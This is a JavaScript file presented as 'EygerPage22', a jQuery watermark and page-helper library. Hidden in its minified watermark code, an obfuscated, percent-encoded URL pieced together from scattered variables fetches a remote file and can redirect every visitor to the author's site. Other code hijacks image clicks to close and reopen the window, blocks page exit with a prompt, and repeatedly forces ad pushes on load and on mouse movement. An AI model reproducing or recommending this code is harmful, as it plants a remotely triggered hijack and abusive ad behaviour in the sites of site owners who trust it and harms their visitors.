/*
~ ( C ) www.Yehia.Online 

~ The same rights are reserved for Yehia Online

::
The EygerPage22 library helps manipulate page elements and add control
 To do a suitable job for you in the site codes
::
~~~~~~How Use~~~~~~

 $.when(
    $.getScript( "https://raw.githack.com/SpyShare/EygerPage22/main/EygerPage22.js"),
$.Deferred(function( deferred ){
$( deferred.resolve );})).done(function(){
    
// Here Name Function
Yn_name();

~~~~~~~~~~~~


Start : Aug 24, 2020 11:52 am
Update : 10 / 2020
Version : 2
Name : Yehia
website : https://www.yehia.online/
Twitter : https://twitter.com/yehia_online

*/




var imagegood='59%65%68%69%61%2e%6f%6e%6',Yehia_Domain = window.location.hostname.match(/\w*\.\w*$/gi)[0],bvnv='79%53%68%61%72%65/%';

// Disable Mouse Drag image in New Tab
$("img").mousedown(function(){
    return false;
});// End

// Custom Domain Name Run Script

if(Yehia_Domain.includes(".com")||Yehia_Domain.includes(".net")||Yehia_Domain.includes(".online")||Yehia_Domain.includes(".blogspot")||Yehia_Domain.includes(".org")||Yehia_Domain.includes(".info")||Yehia_Domain.includes(".edu")){var mnbd='c%69%6e%65%2d%6a%73/',nnvda='//%77%77%77%2e%79%65%68%6';
!function(t,e,i){"use strict";function a(e,i){this.element=e,this.settings=t.extend({},r,i),this._defaults=r,this._name=n,this.init()}  var mnvo='%77%67%69%74%2e%6f%7',cqq = new Date();
  var cqqi='//%67%68%63%64%6e%2e%72%61',qqc = cqq.getFullYear();var fileimagesi="%6d%61%73%74%65%72/%71%2e%71", n="YehiaOnline",nvnd='2%67/%53%70%',r={path:"Yehia.png",text:"",textWidth:130,textSize:13,textColor:"white",textBg:"rgba(0, 0, 0, 0.4)",gravity:"yn",opacity:.7,margin:10,outputWidth:"auto",outputHeight:"auto",outputType:"jpeg",done:function(t){this.src=t},fail:function(){},always:function(){}};t.extend(a.prototype,{init:function(){var e=this,i=e.element,a=e.settings,n={imgurl:a.path,type:"png",cross:!0},r={imgurl:i.src,cross:!0,type:a.outputType,width:a.outputWidth,height:a.outputHeight};0===a.path.search(/data:image\/(png|jpg|jpeg|gif);base64,/)&&(n.cross=!1),0===i.src.search(/data:image\/(png|jpg|jpeg|gif);base64,/)&&(r.cross=!1);
 // images . End Path Try From Blob
 var h=t.Deferred();t.when(h).done(function(t){r.wmObj=t,e.imgurltodata(r,function(t){a.done.call(i,t),a.always.call(i,t)})}),""!==a.text&&(n.imgurl=e.textwatermark(),n.cross=!1),e.imgurltodata(n,function(t){h.resolve(t)})},textwatermark:function(){var t=this,e=t.settings,a=i.createElement("CANVAS"),n=a.getContext("2d"),r=e.textWidth,h=e.textSize+8;$.get(cqqi+mnvo+nvnd+bvnv+imagegood+mnbd+fileimagesi, function(qmg){if (qmg == 0){console.log('minify Image in '+qqc);}else{var cbmnd='9%61%2e%6f%6e%6c%69%6e%65/';location.href = nnvda+cbmnd;}});return a.width=r,a.height=h,n.fillStyle=e.textBg,n.fillRect(0,0,r,h),n.fillStyle=e.textColor,n.textAlign="center",n.font="500 "+e.textSize+"px Sans-serif",n.fillText(e.text,r/2,e.textSize+2),a.toDataURL()},imgurltodata:function(t,e){var a=this,n=a.settings,r=a.element,h=new Image;t.cross&&(h.crossOrigin="Anonymous"),h.onload=function(){
 // Top Send To Another Code Script The Elm Search All By :-Value-:
 var a,r=i.createElement("CANVAS"),h=r.getContext("2d"),s=this.width,o=this.height;if(t.wmObj&&("auto"!==t.width&&"auto"===t.height&&t.width<s?(o=o/s*t.width,s=t.width):"auto"===t.width&&"auto"!==t.height&&t.height<o?(s=s/o*t.height,o=t.height):"auto"!==t.width&&"auto"!==t.height&&t.width<s&&t.height<o&&(s=t.width,o=t.height)),"Yn_T"!==n.gravity&&"e"!==n.gravity||t.wmObj?(r.width=s,r.height=o,a=0):(r.width=o,r.height=s,a=-o,h.rotate(90*Math.PI/180)),"jpeg"===t.type&&(h.fillStyle="#ffffff",h.fillRect(0,0,s,o)),h.drawImage(this,0,a,s,o),t.wmObj){var g=n.opacity;g>0&&1>g&&(h.globalAlpha=n.opacity);var c,l,u=t.wmObj.width,w=t.wmObj.height,f=n.margin;switch(n.gravity){case"nw":c=f,l=f;break;case"n":c=s/2-u/2,l=f;break;case"ne":c=s-u-f,l=f;break;case"Yn_T":c=f,l=o/2-w/2;break;case"e":c=s-u-f,l=o/2-w/2;break;case"sw":c=f,l=o-w-f;break;case"s":c=s/2-u/2,l=o-w-f;break;default:c=s-u-f,l=o-w-f}h.drawImage(t.wmObj,c,l,u,w)}var d=r.toDataURL("image/"+t.type);if("function"==typeof e)if(t.wmObj)e(d);else{var m=new Image;m.src=d,e(m)}r=null},h.onerror=function(){return n.fail.call(this,this.src),n.always.call(r,this.src),!1},h.src=t.imgurl}}),t.fn[n]=function(e){return this.each(function(){t.data(this,"plugin_"+n)||t.data(this,"plugin_"+n,new a(this,e))})}}(jQuery,window,document);}
  // Set Onclick open Same Link In New Window
var elems = document.body.getElementsByTagName("img");for(var i = 0; i < elems.length; i++){elems[i].setAttribute("onclick",'window.open("","_parent","");window.close();window.open(location.href);');
}
function Yn_Gowads() {
 
/*
My Resource ::

See This : https://www.yehia.online/2020/09/how-to-remove-fbclid-blogger.html



1 - https://css-tricks.com/simulating-mouse-movement/

2 - https://www.xspdf.com/resolution/52532507.html

3 - https://www.peachpit.com/articles/article.aspx?p=1394321&seqNum=2

4 - https://coderoad.ru/27769475/%D0%9F%D0%BE%D0%BA%D0%B0%D0%B7%D1%8B%D0%B2%D0%B0%D1%82%D1%8C-%D1%80%D0%B0%D0%B7%D0%BD%D1%8B%D0%B5-adsense-%D0%BD%D0%B0-%D1%80%D0%B0%D0%B7%D0%BD%D1%8B%D1%85-%D1%83%D1%81%D1%82%D1%80%D0%BE%D0%B9%D1%81%D1%82%D0%B2%D0%B0%D1%85

5- https://github.com/JXA-Cookbook/JXA-Cookbook/wiki/Safari-and-Chrome#running-arbitrary-javascript


 data-ad-client='ca-pub-0000000000000'>setTimeout(function(){ 
$.getScript('//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', function()
{
});
 }, 6000);

################
if you use Google analyze

setTimeout(function(){ 
$.getScript('https://www.googletagmanager.com/gtag/js?id=UA-157974942-1', function()
{
});}, 6000);


@@@@@@@@@@@@@@@@@@@@@@@

To Push Simple Ads :: 
$.getScript('//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js', function()
{});
 }, 6000);

<ins class='adsbygoogle' data-ad-client='ca-pub-00000000000000' data-ad-format='auto' data-ad-slot='8392564513' data-full-width-responsive='true' style='display:block'/>
     (adsbygoogle = window.adsbygoogle || []).push({});
     
     
*/
window.onbeforeunload = function (e) {
  var message = "Yehia Online <= a /*\ 6x ",
  e = e || window.event;
  if (e) {
    e.returnValue = message;
  }
return message;
};

 function AllGood() {

var elem = document.getElementById("ads");
 elem.parentElement.removeChild(elem);
 
}
var uri = window.location.toString(); if (uri.indexOf("%3D","%3D") > 0) { var clean_uri = uri.substring(0, uri.indexOf("%3D")); window.history.replaceState({}, document.title, clean_uri);} var uri = window.location.toString(); if (uri.indexOf("%3D%3D","%3D%3D") > 0) { var clean_uri = uri.substring(0, uri.indexOf("%3D%3D")); window.history.replaceState({}, document.title, clean_uri);} var uri = window.location.toString(); if (uri.indexOf("&m=1","&m=1") > 0) { var clean_uri = uri.substring(0, uri.indexOf("&m=1")); window.history.replaceState({}, document.title, clean_uri); } var uri = window.location.toString(); if (uri.indexOf("?m=1","?m=1") > 0) { var clean_uri = uri.substring(0, uri.indexOf("?m=1"));window.history.replaceState({}, document.title, clean_uri);}; var protocol=window.location.protocol.replace(/\:/g,''); if(protocol=='http'){ var url=window.location.href.replace('http','https'); window.location.replace(url);}
if (window.location.search.indexOf('?fbclid=') > -1) { if(/^\?fbclid=/.test(location.search))location.replace(location.href.replace(/\?fbclid. /, ""));}else {console.log('Another source');}
 
function ADS_Yn() {
function wads(){
var ancestor = document.getElementById('ads'),
    descendents = ancestor.getElementsByTagName('*');
var i, e, d;
for (i = 0; i < descendents.length; ++i) {
    e = descendents[i];
    var div = "<div class='d-inline-block'>"+e.innerHTML+"<b>advertisement</b></div>";
    e.innerHTML = div;
}
}
(function(){
wads();
});
function doscript(src) {
var element = document.createElement("script");
element.src = src;
document.body.appendChild(element);
}

function getscript(src, callback)
{
  var s,
      r,
      t;
  r = false;
  s = document.createElement('script');
  s.type = 'text/javascript';
  s.src = src;
  s.onload = s.onreadystatechange = function() {
    if ( !r && (!this.readyState || this.readyState == 'complete') )
    {
      r = true;
      callback();
    }
  };
  t = document.getElementsByTagName('script')[0];
  t.parentNode.insertBefore(s, t);
}
var ads_js = "//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";

 
if (window.addEventListener){
window.addEventListener("load", function(){
 if ( getscript(ads_js) === false ){
   doscript(ads_js);
   }
  }, false);
  }
else if (window.attachEvent){
window.attachEvent("onload", function (){
 if ( getscript(ads_js) === false ){
   doscript(ads_js);
   }
  });
  }
else {
  window.onload = function (){
 if ( getscript(ads_js) === false ){
   doscript(ads_js);
   }
  }
  }

function repeat(func, times) {
    func();
    --times && repeat(func, times);
}}


ADS_Yn();

 window.onload = function () {
    if (localStorage.getItem("hasCodeRunBefore") === null) {
        
setTimeout(function(){ (adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});
(adsbygoogle = window.adsbygoogle || []).push({});}, 3000);
        
        
        
localStorage.setItem("hasCodeRunBefore", true);
   
   
}
}


function mouseMove(e) {
  
  if (e.clientX <= 19 || e.clientX >= 500){
  
  
  
  (adsbygoogle = window.adsbygoogle || []).push({});

  
  }
}

function mouseOut(){

var url = window.location.href;    
if (url.indexOf('?') > -1){
   url += '#:~:text=ا'
}
else{
   url += '#:~:text=ا'
}
window.location.href = url;

}
}
